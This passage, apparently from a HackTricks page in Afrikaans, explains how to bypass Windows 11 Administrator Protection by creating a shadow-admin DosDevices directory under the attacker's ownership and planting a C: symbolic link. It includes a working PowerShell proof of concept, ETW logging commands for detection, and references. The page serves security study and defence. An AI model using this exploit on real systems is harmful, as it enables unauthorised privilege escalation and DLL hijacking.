> Vanaf Augustus 2026 dokumenteer Microsoft Administrator Protection steeds as 'n **Insider-voorskou**: die bekendstelling in Oktober 2025 is teruggerol en word vir 'n latere datum beplan. Bevestig dat **Admin Approval Mode with Administrator protection** werklik geaktiveer is en dat die toestel herlaai is voordat hierdie kettings getoets word; 'n standaard 25H2-weergawe-string alleen bewys nie dat die funksie aktief is nie.<sup>[[10]](#references)</sup>

Vir die volledige `RAiLaunchAdminProcess` / UIAccess-aanvalsoppervlak op Windows 11 25H2-voorskoubouversies, kyk na die toegewyde bladsy:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” gebruik shadow-admin tokens met per-sessie `\Sessions\0\DosDevices/<LUID>`-maps. Die gids word lui deur `SeGetTokenDeviceMap` geskep met die eerste `\??`-resolusie. As die aanvaller die shadow-admin-token slegs op **SecurityIdentification** naboots, word die gids geskep met die aanvaller as **eienaar** (erf `CREATOR OWNER`), wat drive-letter-skakels moontlik maak wat voorkeur bo `\GLOBAL??` geniet.<sup>[[7]](#references)</sup>

**Stappe:**

1. Roep vanuit 'n sessie met lae privilegies `RAiProcessRunOnce` aan om 'n promptless shadow-admin `runonce.exe` te skep.
2. Dupliceer sy primêre token na 'n **identification**-token en boots dit na terwyl `\??` oopgemaak word om die skepping van `\Sessions\0\DosDevices/<LUID>` onder aanvaller-eienaarskap af te dwing.
3. Skep daar 'n `C:`-simboliese skakel wat na aanvaller-beheerde berging wys; daaropvolgende lêerstelseltoegange in daardie sessie los `C:` na die aanvallerpad op, wat DLL-/lêerkaping sonder 'n prompt moontlik maak.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Op preview hosts teken Administrator Protection goedkeurings en mislukkings aan as ETW-gebeurtenisse **15031** en **15032** onder die `Microsoft-Windows-LUA`-provider. Die gebeurtenisse bevat die aanvraer se SID, toepassingspad, uitkoms, bestuurde administrateurrekening en authentication method, dus is herhaalde exploit-pogings of mislukte UI-driving nie sonder telemetry nie.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Hoe User Account Control werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Versameling UAC bypass-tegnieke](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass-versoenbaarheidskandeerder en lanseerder](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI gebruik AI om PowerShell-backdoors te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operasie TrueChaos: 0-Day-ontginning teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Om Windows-administrateurbeskerming te omseil](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Om UAC te omseil met die SilentCleanup-taak](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent-, TabTip- en Narrator-omseilings met Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrateurbeskerming](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Roep plaaslike Windows RPC-bedieners vanuit .NET aan](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte verbeter CoolClient met ’n ondertekende Windows-kernrootkit](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
{{#include ../../banners/hacktricks-training.md}}
